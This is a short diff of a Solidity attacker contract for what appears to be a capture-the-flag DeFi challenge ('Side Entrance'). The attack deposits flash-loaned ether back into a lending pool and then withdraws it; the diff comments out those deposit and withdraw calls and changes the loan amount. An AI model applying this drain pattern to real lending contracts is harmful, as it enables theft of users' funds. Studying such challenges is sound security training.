@@ -16,14 +16,14 @@ contract AttackerContract is IFlashLoanEtherReceiver {
     address attacker;
 
     function execute() external payable {
-        SideEntranceLenderPool.deposit{value: ETHER_IN_POOL}();
-        SideEntranceLenderPool.withdraw();
+        //SideEntranceLenderPool.deposit{value: ETHER_IN_POOL}();
+        //SideEntranceLenderPool.withdraw();
     }
 
     function attack(address sideEntranceLenderPoolAddress, address attackerAddress) public {
         attacker = attackerAddress;
         sideEntranceLenderPool = SideEntranceLenderPool(sideEntranceLenderPoolAddress);
-        sideEntranceLenderPool.flashLoan(TOKENS_IN_POOL);
+        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
     }
 }
 
